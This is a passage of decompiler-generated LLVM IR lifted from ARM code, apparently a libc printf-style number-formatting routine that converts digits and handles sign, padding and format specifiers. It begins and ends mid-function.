  %stack_var_-168 = alloca i32, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-86 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-85 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14344 = load i32, i32* @r4, align 4
  store i32 %v3_14344, i32* %stack_var_-36, align 4
  %v6_14344 = load i32, i32* @r5, align 4
  %v9_14344 = load i32, i32* @r6, align 4
  %v12_14344 = load i32, i32* @r7, align 4
  %v15_14344 = load i32, i32* @r8, align 4
  %v18_14344 = load i32, i32* @sb, align 4
  %v1_1434c = add i32 %tmp, 8
  %v2_1434c = inttoptr i32 %v1_1434c to i8*
  %v3_1434c = load i8, i8* %v2_1434c, align 1
  %v4_1434c = zext i8 %v3_1434c to i32
  store i32 %v4_1434c, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  %v1_14354 = or i32 %v4_1434c, 32
  %v2_14358 = ptrtoint i32* %stack_var_-184 to i32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_1435c = icmp ult i32 %v1_14354, 97
  store i1 %v6_1435c, i1* %cpsr_n.global-to-local, align 1
  %v7_1435c = icmp eq i32 %v1_14354, 97
  store i1 %v7_1435c, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v2_14368 = load i32, i32* %arg4, align 4
  store i32 %v2_14368, i32* %r8.global-to-local, align 4
  br i1 %v7_1435c, label %bb, label %bb180

bb:                                               ; preds = %entry
  %v2_1436c = add nuw nsw i32 %v4_1434c, 6
  store i32 %v2_1436c, i32* %r3.global-to-local, align 4
  br label %bb180

bb180:                                            ; preds = %entry, %bb
  %v1_14380 = phi i32 [ 101, %entry ], [ %v2_1436c, %bb ]
  store i32 %arg2, i32* %stack_var_-192, align 4
  %v1_14378 = add i32 %tmp, 12
  %v2_14378 = inttoptr i32 %v1_14378 to i32*
  %v3_14378 = load i32, i32* %v2_14378, align 4
  store i32 %v3_14378, i32* %r2.global-to-local, align 4
  %v1_1437c = add i32 %tmp, 4
  %v2_1437c = inttoptr i32 %v1_1437c to i32*
  %v3_1437c = load i32, i32* %v2_1437c, align 4
  store i32 %v3_1437c, i32* %r1.global-to-local, align 4
  br i1 %v7_1435c, label %bb181, label %bb182

bb181:                                            ; preds = %bb180
  %v2_14380 = urem i32 %v1_14380, 256
  store i32 %v2_14380, i32* %r7.global-to-local, align 4
  br label %bb182

bb182:                                            ; preds = %bb180, %bb181
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14384 = icmp slt i32 %v2_14368, 0
  store i1 %v1_14384, i1* %cpsr_n.global-to-local, align 1
  %v2_14384 = icmp eq i32 %v2_14368, 0
  store i1 %v2_14384, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_14384, label %bb183, label %bb184

bb183:                                            ; preds = %bb182
  store i32 6, i32* %r8.global-to-local, align 4
  br label %bb184

bb184:                                            ; preds = %bb182, %bb183
  %v1_14390 = and i32 %v3_14378, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14390 = icmp eq i32 %v1_14390, 0
  store i1 %v2_14390, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-50, align 1
  store i32 %arg1, i32* %stack_var_-192, align 4
  br i1 %v2_14390, label %dec_label_pc_143a4, label %dec_label_pc_14414

dec_label_pc_143a4:                               ; preds = %bb184
  %v1_143a4 = urem i32 %v3_14378, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_143a4 = icmp eq i32 %v1_143a4, 0
  store i1 %v2_143a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143a4, label %.thread10, label %dec_label_pc_14414

dec_label_pc_14414:                               ; preds = %dec_label_pc_143a4, %bb184
  %storemerge = phi i8 [ 43, %bb184 ], [ 32, %dec_label_pc_143a4 ]
  store i8 %storemerge, i8* %stack_var_-50, align 1
  %v2_14418 = add i32 %tmp, 16
  %v3_14418 = inttoptr i32 %v2_14418 to i32*
  store i32 32, i32* %v3_14418, align 4
  %v0_14420 = load i32, i32* %r7.global-to-local, align 4
  %v1_14420 = add i32 %v0_14420, -96
  %v3_14420 = sub i32 95, %v0_14420
  %v4_14420 = and i32 %v3_14420, %v0_14420
  %v5_14420 = icmp slt i32 %v4_14420, 0
  store i1 %v5_14420, i1* %cpsr_v.global-to-local, align 1
  %v6_14420 = icmp slt i32 %v1_14420, 0
  store i1 %v6_14420, i1* %cpsr_n.global-to-local, align 1
  %v7_14420 = icmp eq i32 %v0_14420, 96
  store i1 %v7_14420, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-168, align 4
  %tmp242 = icmp ult i32 %v0_14420, 97
  br i1 %tmp242, label %bb185, label %.thread105

bb185:                                            ; preds = %dec_label_pc_14414
  store i32 12, i32* %r3.global-to-local, align 4
  br label %.thread105

.thread105:                                       ; preds = %dec_label_pc_14414, %bb185
  %v4_14438 = phi i32 [ 12, %bb185 ], [ 3, %dec_label_pc_14414 ]
  %v4_14438..v1_143c8 = select i1 %tmp242, i32 %v4_14438, i32 8
  store i32 ptrtoint ([4 x i8]* @global_var_1af8c.849 to i32), i32* %r2.global-to-local, align 4
  %v2_14444 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_14444, i32* %r6.global-to-local, align 4
  %v2_14448 = add i32 %v4_14438..v1_143c8, ptrtoint ([4 x i8]* @global_var_1af8c.849 to i32)
  store i32 %v2_14448, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_148cc

.thread10:                                        ; preds = %dec_label_pc_143a4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_144d0 = ptrtoint i32* %stack_var_-85 to i32
  store i32 %v2_144d0, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_144d8

dec_label_pc_144d8:                               ; preds = %dec_label_pc_14548, %.thread10
  %v3_144ec = phi i32 [ %v2_14538, %dec_label_pc_14548 ], [ %v3_14344, %.thread10 ]
  %v1_144ec = phi i1 [ %v5_1454c, %dec_label_pc_14548 ], [ false, %.thread10 ]
  %v0_144ec = phi i1 [ %v6_1454c, %dec_label_pc_14548 ], [ false, %.thread10 ]
  %v2_144ec = xor i1 %v1_144ec, %v0_144ec
  br i1 %v2_144ec, label %bb187, label %bb186

bb186:                                            ; preds = %dec_label_pc_144d8
  %v4_144ec = sub i32 0, %v3_144ec
  store i32 %v4_144ec, i32* %r4.global-to-local, align 4
  br label %bb187

bb187:                                            ; preds = %dec_label_pc_144d8, %bb186
  %v0_144f0 = phi i32 [ %v3_144ec, %dec_label_pc_144d8 ], [ %v4_144ec, %bb186 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_144f0 = icmp slt i32 %v0_144f0, 0
  store i1 %v1_144f0, i1* %cpsr_n.global-to-local, align 1
  %v2_144f0 = icmp eq i32 %v0_144f0, 0
  store i1 %v2_144f0, i1* %cpsr_z.global-to-local, align 1
  %v0_1450c = load i32, i32* %sl.global-to-local, align 4
  %v1_1450c = add i32 %v0_1450c, 9
  store i32 %v1_1450c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14514

dec_label_pc_14514:                               ; preds = %dec_label_pc_14514.dec_label_pc_14514_crit_edge, %bb187
  %v1_14528 = phi i32 [ %v1_14528.pre, %dec_label_pc_14514.dec_label_pc_14514_crit_edge ], [ %v1_1450c, %bb187 ]
  %v0_14520 = phi i32 [ %v0_1453c, %dec_label_pc_14514.dec_label_pc_14514_crit_edge ], [ 0, %bb187 ]
  %v0_1452c = phi i32 [ %v2_14538, %dec_label_pc_14514.dec_label_pc_14514_crit_edge ], [ %v0_144f0, %bb187 ]
  %v2_1451c = urem i32 %v0_1452c, 10
  %v1_14520 = add i32 %v0_14520, 1
  store i32 %v1_14520, i32* %r5.global-to-local, align 4
  %v1_14524 = or i32 %v2_1451c, 48
  store i32 %v1_14524, i32* %r2.global-to-local, align 4
  %v2_14528 = sub i32 %v1_14528, %v1_14520
  store i32 %v2_14528, i32* %r3.global-to-local, align 4
  store i32 %v0_1452c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_14534 = trunc i32 %v1_14524 to i8
  %v3_14534 = inttoptr i32 %v2_14528 to i8*
  store i8 %v1_14534, i8* %v3_14534, align 1
  %v0_14538 = load i32, i32* %r0.global-to-local, align 4
  %v1_14538 = load i32, i32* %r1.global-to-local, align 4
  %v2_14538 = udiv i32 %v0_14538, %v1_14538
  store i32 %v2_14538, i32* %r0.global-to-local, align 4
  %v0_1453c = load i32, i32* %r5.global-to-local, align 4
  %v1_1453c = add i32 %v0_1453c, -8
  %v3_1453c = sub i32 7, %v0_1453c
  %v4_1453c = and i32 %v3_1453c, %v0_1453c
  %v5_1453c = icmp slt i32 %v4_1453c, 0
  store i1 %v5_1453c, i1* %cpsr_v.global-to-local, align 1
  %v6_1453c = icmp slt i32 %v1_1453c, 0
  store i1 %v6_1453c, i1* %cpsr_n.global-to-local, align 1
  %v7_1453c = icmp eq i32 %v0_1453c, 8
  store i1 %v7_1453c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_14538, i32* %r4.global-to-local, align 4
  %v7_14544 = icmp slt i32 %v0_1453c, 9
  br i1 %v7_14544, label %dec_label_pc_14514.dec_label_pc_14514_crit_edge, label %dec_label_pc_14548

dec_label_pc_14514.dec_label_pc_14514_crit_edge:  ; preds = %dec_label_pc_14514
  %v1_14528.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14514

dec_label_pc_14548:                               ; preds = %dec_label_pc_14514
  %v0_14548 = load i32, i32* %r6.global-to-local, align 4
  %v1_14548 = add i32 %v0_14548, 1
  store i32 %v1_14548, i32* %r6.global-to-local, align 4
  %v3_1454c = sub i32 -1, %v0_14548
  %v4_1454c = and i32 %v1_14548, %v3_1454c
  %v5_1454c = icmp slt i32 %v4_1454c, 0
  store i1 %v5_1454c, i1* %cpsr_v.global-to-local, align 1
  %v6_1454c = icmp slt i32 %v0_14548, 0
  store i1 %v6_1454c, i1* %cpsr_n.global-to-local, align 1
  %v7_1454c = icmp eq i32 %v0_14548, 0
  store i1 %v7_1454c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1454c, label %dec_label_pc_144d8, label %dec_label_pc_14554

dec_label_pc_14554:                               ; preds = %dec_label_pc_14548
  %v0_14554 = load i32, i32* %r7.global-to-local, align 4
  %v1_14554 = add i32 %v0_14554, -96
  %v3_14554 = sub i32 95, %v0_14554
  %v4_14554 = and i32 %v3_14554, %v0_14554
  %v5_14554 = icmp slt i32 %v4_14554, 0
  store i1 %v5_14554, i1* %cpsr_v.global-to-local, align 1
  %v6_14554 = icmp slt i32 %v1_14554, 0
  store i1 %v6_14554, i1* %cpsr_n.global-to-local, align 1
  %v7_14554 = icmp eq i32 %v0_14554, 96
  store i1 %v7_14554, i1* %cpsr_z.global-to-local, align 1
  %tmp243 = icmp ult i32 %v0_14554, 97
  br i1 %tmp243, label %bb188, label %thread-pre-split

bb188:                                            ; preds = %dec_label_pc_14554
  %v5_14560 = add i32 %v0_14554, 32
  store i32 %v5_14560, i32* %r3.global-to-local, align 4
  %v5_14564 = urem i32 %v5_14560, 256
  store i32 %v5_14564, i32* %r7.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_14554, %bb188
  %stack_var_-66.0108114 = phi i8 [ 69, %bb188 ], [ %tmp151, %dec_label_pc_14554 ]
  %v0_14584 = phi i32 [ %v5_14564, %bb188 ], [ %v0_14554, %dec_label_pc_14554 ]
  %v7_14568 = icmp eq i32 %v0_14584, 103
  %.229 = zext i1 %v7_14568 to i32
  store i32 %.229, i32* %r3.global-to-local, align 4
  %v0_14574 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14574 = icmp slt i32 %v0_14574, 0
  store i1 %v1_14574, i1* %cpsr_n.global-to-local, align 1
  %v2_14574 = icmp eq i32 %v0_14574, 0
  store i1 %v2_14574, i1* %cpsr_z.global-to-local, align 1
  %tmp191 = icmp slt i32 %v0_14574, 1
  br i1 %tmp191, label %.thread13, label %bb192

.thread13:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb194

bb192:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1457c = icmp eq i1 %v7_14568, false
  store i1 %v2_1457c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1457c, label %bb194, label %bb193

bb193:                                            ; preds = %bb192
  %v2_14580 = add i32 %v0_14574, -1
  store i32 %v2_14580, i32* %r8.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %.thread13, %bb192, %bb193
  %v0_14590 = phi i32 [ %v0_14574, %.thread13 ], [ %v0_14574, %bb192 ], [ %v2_14580, %bb193 ]
  %v1_14584 = add i32 %v0_14584, -102
  %v3_14584 = sub i32 101, %v0_14584
  %v4_14584 = and i32 %v3_14584, %v0_14584
  %v5_14584 = icmp slt i32 %v4_14584, 0
  store i1 %v5_14584, i1* %cpsr_v.global-to-local, align 1
  %v6_14584 = icmp slt i32 %v1_14584, 0
  store i1 %v6_14584, i1* %cpsr_n.global-to-local, align 1
  %v7_14584 = icmp eq i32 %v0_14584, 102
  store i1 %v7_14584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14584, label %dec_label_pc_14590, label %bb195

bb195:                                            ; preds = %bb194
  store i32 %v0_14590, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_145b4

dec_label_pc_14590:                               ; preds = %bb194
  %v1_14590 = load i32, i32* %sb.global-to-local, align 4
  %v2_14590 = add i32 %v1_14590, %v0_14590
  store i32 %v2_14590, i32* %ip.global-to-local, align 4
  %v2_14594 = add i32 %v2_14590, 1
  %v4_14594 = sub i32 0, %v2_14590
  %v5_14594 = and i32 %v2_14594, %v4_14594
  %v6_14594 = icmp slt i32 %v5_14594, 0
  store i1 %v6_14594, i1* %cpsr_v.global-to-local, align 1
  %v7_14594 = icmp slt i32 %v2_14594, 0
  store i1 %v7_14594, i1* %cpsr_n.global-to-local, align 1
  %v8_14594 = icmp eq i32 %v2_14594, 0
  store i1 %v8_14594, i1* %cpsr_z.global-to-local, align 1
  %v6_14598 = icmp slt i32 %v2_14590, -1
  br i1 %v6_14598, label %dec_label_pc_1459c, label %dec_label_pc_145b4

dec_label_pc_1459c:                               ; preds = %dec_label_pc_14590
  %v2_1459c = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_1459c, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_145a8 = bitcast i32* %stack_var_-87 to i8*
  %v3_145a8 = call i32 @__GI_memset(i8* %v2_145a8, i32 48)
  store i32 %v3_145a8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_145b4

dec_label_pc_145b4:                               ; preds = %dec_label_pc_14590, %bb195, %dec_label_pc_1459c
  %v1_145f869 = phi i32 [ %v2_14538, %bb195 ], [ %v3_145a8, %dec_label_pc_1459c ], [ %v2_14538, %dec_label_pc_14590 ]
  %v1_145dc = phi i32 [ %v0_14590, %bb195 ], [ -1, %dec_label_pc_1459c ], [ %v2_14590, %dec_label_pc_14590 ]
  %v1_145b8 = add i32 %v1_145dc, -16
  %v3_145b8 = sub i32 15, %v1_145dc
  %v4_145b8 = and i32 %v3_145b8, %v1_145dc
  %v5_145b8 = icmp slt i32 %v4_145b8, 0
  store i1 %v5_145b8, i1* %cpsr_v.global-to-local, align 1
  %v6_145b8 = icmp slt i32 %v1_145b8, 0
  store i1 %v6_145b8, i1* %cpsr_n.global-to-local, align 1
  %v7_145b8 = icmp eq i32 %v1_145dc, 16
  store i1 %v7_145b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-86, align 4
  %v2_145c4 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_145c4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-87, align 4
  %v7_145cc = icmp sgt i32 %v1_145dc, 16
  br i1 %v7_145cc, label %.thread18, label %dec_label_pc_145d8

.thread18:                                        ; preds = %dec_label_pc_145b4
  store i32 0, i32* %r0.global-to-local, align 4
  %v10_145d0 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v10_145d0, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_145d8:                               ; preds = %dec_label_pc_145b4
  %v2_145d8 = ptrtoint i32* %stack_var_-86 to i32
  %v2_145dc = add i32 %v1_145dc, %v2_145d8
  store i32 %v2_145dc, i32* %r3.global-to-local, align 4
  %v1_145e0 = add i32 %v2_145dc, 2
  %v2_145e0 = inttoptr i32 %v1_145e0 to i8*
  %v3_145e0 = load i8, i8* %v2_145e0, align 1
  %v4_145e0 = zext i8 %v3_145e0 to i32
  store i32 %v4_145e0, i32* %r2.global-to-local, align 4
  store i32 %v1_145e0, i32* %r1.global-to-local, align 4
  %v2_145e8 = icmp ugt i8 %v3_145e0, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_145e8 = icmp ult i8 %v3_145e0, 52
  store i1 %v6_145e8, i1* %cpsr_n.global-to-local, align 1
  %v7_145e8 = icmp eq i8 %v3_145e0, 52
  store i1 %v7_145e8, i1* %cpsr_z.global-to-local, align 1
  %v2_145ec = xor i1 %v2_145e8, true
  %v3_145ec = or i1 %v7_145e8, %v2_145ec
  br i1 %v3_145ec, label %bb196, label %bb197

bb196:                                            ; preds = %dec_label_pc_145d8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_145d8, %bb196
  %v1_145f868 = phi i32 [ %v1_145f869, %dec_label_pc_145d8 ], [ 0, %bb196 ]
  %v2_145f0 = xor i1 %v7_145e8, true
  %v3_145f0 = and i1 %v2_145e8, %v2_145f0
  br i1 %v3_145f0, label %bb198, label %.preheader

bb198:                                            ; preds = %bb197
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %.thread18, %bb197, %bb198, %.backedge
  %v1_145f8 = phi i32 [ %v1_145f8.pre, %.backedge ], [ 0, %.thread18 ], [ %v1_145f868, %bb197 ], [ 1, %bb198 ]
  %v0_145f4 = phi i32 [ %v0_14600, %.backedge ], [ %v10_145d0, %.thread18 ], [ %v1_145e0, %bb197 ], [ %v1_145e0, %bb198 ]
  %v1_145f4 = add i32 %v0_145f4, -1
  %v2_145f4 = inttoptr i32 %v1_145f4 to i8*
  %v3_145f4 = load i8, i8* %v2_145f4, align 1
  %v4_145f4 = zext i8 %v3_145f4 to i32
  store i32 %v1_145f4, i32* %r1.global-to-local, align 4
  %v2_145f8 = add i32 %v4_145f4, %v1_145f8
  store i32 %v2_145f8, i32* %r3.global-to-local, align 4
  %v1_145fc = trunc i32 %v2_145f8 to i8
  store i8 %v1_145fc, i8* %v2_145f4, align 1
  %v0_14600 = load i32, i32* %r1.global-to-local, align 4
  %v1_14600 = inttoptr i32 %v0_14600 to i8*
  %v2_14600 = load i8, i8* %v1_14600, align 1
  %v3_14600 = zext i8 %v2_14600 to i32
  store i32 %v3_14600, i32* %r2.global-to-local, align 4
  %v2_14604 = icmp ugt i8 %v2_14600, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_14604 = icmp ult i8 %v2_14600, 57
  store i1 %v6_14604, i1* %cpsr_n.global-to-local, align 1
  %v7_14604 = icmp eq i8 %v2_14600, 57
  store i1 %v7_14604, i1* %cpsr_z.global-to-local, align 1
  %v2_14608 = xor i1 %v2_14604, true
  %v3_14608 = or i1 %v7_14604, %v2_14608
  br i1 %v3_14608, label %bb199, label %bb200

bb199:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb200

bb200:                                            ; preds = %.preheader, %bb199
  %v2_1460c = xor i1 %v7_14604, true
  %v3_1460c = and i1 %v2_14604, %v2_1460c
  br i1 %v3_1460c, label %bb201, label %._crit_edge

._crit_edge:                                      ; preds = %bb200
  %v1_14614.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb202

bb201:                                            ; preds = %bb200
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb202

bb202:                                            ; preds = %._crit_edge, %bb201
  %v1_14614 = phi i32 [ %v1_14614.pre, %._crit_edge ], [ 1, %bb201 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_14610 = icmp ult i8 %v2_14600, 48
  store i1 %v6_14610, i1* %cpsr_n.global-to-local, align 1
  %v7_14610 = icmp eq i8 %v2_14600, 48
  store i1 %v7_14610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14610, label %.thread20, label %bb203

.thread20:                                        ; preds = %bb202
  %v2_14614 = or i32 %v1_14614, 1
  store i32 %v2_14614, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1461821 = icmp slt i32 %v2_14614, 0
  store i1 %v1_1461821, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb203:                                            ; preds = %bb202
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14618 = icmp slt i32 %v1_14614, 0
  store i1 %v1_14618, i1* %cpsr_n.global-to-local, align 1
  %v2_14618 = icmp eq i32 %v1_14614, 0
  store i1 %v2_14618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14618, label %dec_label_pc_14620, label %.backedge

.backedge:                                        ; preds = %bb203, %.thread20
  %v1_145f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_14620:                               ; preds = %bb203
  store i32 %v2_145c4, i32* %r2.global-to-local, align 4
  %v2_14624 = ptrtoint i32* %stack_var_-86 to i32
  store i32 %v2_14624, i32* %r3.global-to-local, align 4
  %v2_14628 = sub i32 %v0_14600, %v2_14624
  %v3_14628 = icmp uge i32 %v0_14600, %v2_14624
  %v4_14628 = xor i32 %v0_14600, %v2_14624
  %v5_14628 = xor i32 %v2_14628, %v0_14600
  %v6_14628 = and i32 %v5_14628, %v4_14628
  %v7_14628 = icmp slt i32 %v6_14628, 0
  store i1 %v7_14628, i1* %cpsr_v.global-to-local, align 1
  %v8_14628 = icmp slt i32 %v2_14628, 0
  store i1 %v8_14628, i1* %cpsr_n.global-to-local, align 1
  %v9_14628 = icmp eq i32 %v0_14600, %v2_14624
  store i1 %v9_14628, i1* %cpsr_z.global-to-local, align 1
  %v2_1462c = xor i1 %v3_14628, true
  %v3_1462c = or i1 %v9_14628, %v2_1462c
  br i1 %v3_1462c, label %bb204, label %.thread124

bb204:                                            ; preds = %dec_label_pc_14620
  store i32 %v2_14624, i32* %r2.global-to-local, align 4
  store i32 %v2_14624, i32* %r1.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_14620, %bb204
  %v2_14648 = phi i32 [ %v2_14624, %bb204 ], [ %v0_14600, %dec_label_pc_14620 ]
  %v4_14638123 = phi i32 [ %v2_14624, %bb204 ], [ %v2_145c4, %dec_label_pc_14620 ]
  %v2_14634 = xor i1 %v9_14628, true
  %v3_14634 = and i1 %v3_14628, %v2_14634
  br i1 %v3_14634, label %bb205, label %.thread125

bb205:                                            ; preds = %.thread124
  %v4_14634 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v4_14634, i32* %r0.global-to-local, align 4
  %v5_14638 = add i32 %v4_14638123, 2
  store i32 %v5_14638, i32* %r2.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb205
  br i1 %v3_1462c, label %bb206, label %bb207

bb206:                                            ; preds = %.thread125
  %v4_1463c = load i32, i32* %sb.global-to-local, align 4
  %v5_1463c = add i32 %v4_1463c, 1
  store i32 %v5_1463c, i32* %r0.global-to-local, align 4
  br label %bb207

bb207:                                            ; preds = %.thread125, %bb206
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14644 = load i32, i32* %r7.global-to-local, align 4
  %v1_14644 = add i32 %v0_14644, -103
  %v3_14644 = sub i32 102, %v0_14644
  %v4_14644 = and i32 %v3_14644, %v0_14644
  %v5_14644 = icmp slt i32 %v4_14644, 0
  store i1 %v5_14644, i1* %cpsr_v.global-to-local, align 1
  %v6_14644 = icmp slt i32 %v1_14644, 0
  store i1 %v6_14644, i1* %cpsr_n.global-to-local, align 1
  %v7_14644 = icmp eq i32 %v0_14644, 103
  store i1 %v7_14644, i1* %cpsr_z.global-to-local, align 1
  %v3_14648 = add i32 %v2_14648, 1
  %v4_14648 = inttoptr i32 %v3_14648 to i8*
  store i8 0, i8* %v4_14648, align 1
  %v0_1464c = load i32, i32* %r1.global-to-local, align 4
  %v1_1464c = add i32 %v0_1464c, 1
  store i32 %v1_1464c, i32* %r1.global-to-local, align 4
  %v0_14650 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14650, label %bb208, label %dec_label_pc_14680

bb208:                                            ; preds = %bb207
  %v0_14654 = load i32, i32* %r0.global-to-local, align 4
  %v1_14654 = load i32, i32* %ip.global-to-local, align 4
  %not.v7_14658 = icmp sge i32 %v1_14654, %v0_14654
  %. = zext i1 %not.v7_14658 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_14660 = add i32 %v0_14654, 4
  %v4_14660 = sub i32 0, %v0_14654
  %v5_14660 = and i32 %v2_14660, %v4_14660
  %v6_14660 = icmp slt i32 %v5_14660, 0
  store i1 %v6_14660, i1* %cpsr_v.global-to-local, align 1
  %v7_14660 = icmp slt i32 %v2_14660, 0
  store i1 %v7_14660, i1* %cpsr_n.global-to-local, align 1
  %v8_14660 = icmp eq i32 %v2_14660, 0
  store i1 %v8_14660, i1* %cpsr_z.global-to-local, align 1
  %v5_14664 = icmp slt i32 %v0_14654, -4
  br i1 %v5_14664, label %.thread24, label %bb209

.thread24:                                        ; preds = %bb208
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

bb209:                                            ; preds = %bb208
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14668 = icmp eq i1 %not.v7_14658, false
  store i1 %v2_14668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14668, label %.thread, label %bb210

.thread:                                          ; preds = %.thread24, %bb209
  %v1_1466c29 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1466c29, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1468c

bb210:                                            ; preds = %bb209
  %v3_14670 = sub i32 %v1_14654, %v0_14654
  store i32 %v3_14670, i32* %r8.global-to-local, align 4
  store i32 102, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14698

dec_label_pc_14680:                               ; preds = %bb207
  %v0_14680 = load i32, i32* %r7.global-to-local, align 4
  %v1_14680 = add i32 %v0_14680, -102
  %v3_14680 = sub i32 101, %v0_14680
  %v4_14680 = and i32 %v3_14680, %v0_14680
  %v5_14680 = icmp slt i32 %v4_14680, 0
  store i1 %v5_14680, i1* %cpsr_v.global-to-local, align 1
  %v6_14680 = icmp slt i32 %v1_14680, 0
  store i1 %v6_14680, i1* %cpsr_n.global-to-local, align 1
  %v7_14680 = icmp eq i32 %v0_14680, 102
  store i1 %v7_14680, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_14680, i32* %sl.global-to-local, align 4
  br i1 %v7_14680, label %dec_label_pc_14680.dec_label_pc_14698_crit_edge, label %dec_label_pc_1468c

dec_label_pc_14680.dec_label_pc_14698_crit_edge:  ; preds = %dec_label_pc_14680
  %v0_14698.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14698

dec_label_pc_1468c:                               ; preds = %.thread, %dec_label_pc_14680
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_146a8

dec_label_pc_14698:                               ; preds = %bb210, %dec_label_pc_14680.dec_label_pc_14698_crit_edge
  %v0_14698 = phi i32 [ %v0_14698.pre, %dec_label_pc_14680.dec_label_pc_14698_crit_edge ], [ %v0_14654, %bb210 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14698 = icmp slt i32 %v0_14698, 0
  store i1 %v1_14698, i1* %cpsr_n.global-to-local, align 1
  %v2_14698 = icmp eq i32 %v0_14698, 0
  store i1 %v2_14698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_14698, label %bb211, label %bb212

